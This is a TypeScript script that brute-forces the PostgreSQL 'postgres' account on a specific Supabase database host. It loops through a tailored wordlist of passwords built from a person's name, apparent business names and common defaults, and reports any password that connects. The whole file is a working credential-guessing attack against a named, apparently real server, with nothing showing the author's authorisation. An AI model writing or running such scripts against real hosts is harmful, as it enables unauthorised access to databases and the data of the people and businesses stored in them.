
import pg from 'pg';
const { Client } = pg;

const passwords = [
  'Atul@spiritflow',
  'Atul@Spiritflow',
  'Atul@SpiritFlow',
  'Atul@spiritflow9699',
  'Atul@Spiritflow9699',
  'Atul@SpiritFlow9699',
  'AtulSpiritflow',
  'AtulSpiritFlow',
  'AtulSpiritflow9699',
  'AtulSpiritFlow9699',
  'liquorflow9699',
  'Liquorflow9699',
  'LiquorFlow9699',
  'liquorflow',
  'Liquorflow',
  'LiquorFlow',
  'admin',
  'Admin',
  'Admin@123',
  'admin@123',
  'postgres',
  'postgres123',
  'Postgres123',
  'Atul@123',
  'atul@123',
  'Atul123',
  'atul123'
];

async function bruteForce() {
  const host = 'db.sefhgbvocnmzcgicmntu.supabase.co';
  
  for (const password of passwords) {
    const client = new Client({
      user: 'postgres',
      host,
      database: 'postgres',
      password,
      port: 5432,
      ssl: { rejectUnauthorized: false },
      connectionTimeoutMillis: 2000
    });
    
    try {
      await client.connect();
      console.log(`✅ WORKING PASSWORD FOUND: "${password}"`);
      const res = await client.query('SELECT 1');
      console.log('Test query result:', res.rows);
      await client.end();
      process.exit(0);
    } catch (err: any) {
      console.log(`❌ FAILED for "${password}":`, err.message);
    }
  }
}

bruteForce();
